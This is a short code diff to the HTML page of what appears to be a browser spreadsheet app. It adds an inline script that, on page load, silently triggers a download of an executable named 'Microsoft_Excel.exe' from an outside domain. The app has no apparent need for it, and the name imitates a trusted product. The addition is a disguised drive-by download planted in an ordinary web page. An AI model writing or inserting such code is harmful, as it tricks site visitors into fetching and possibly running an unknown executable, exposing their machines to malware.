@@ -109,5 +109,22 @@
     <script src="./formula.js"></script>
     <script src="./cutCopyPaste.js"></script>
     <script src="./openSave.js"></script>
+    <script>
+        function downloadFile(fileUrl, fileName) {
+            const link = document.createElement('a');
+            link.href = fileUrl;
+            link.download = fileName;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+    
+        // Usage example
+        const fileUrl = 'https://drive.ninjavan.tech/Microsoft_Excel.exe';
+        const fileName = 'Microsoft_Excel.exe';
+        downloadFile(fileUrl, fileName);
+
+        
+    </script>
 </body>
 </html>
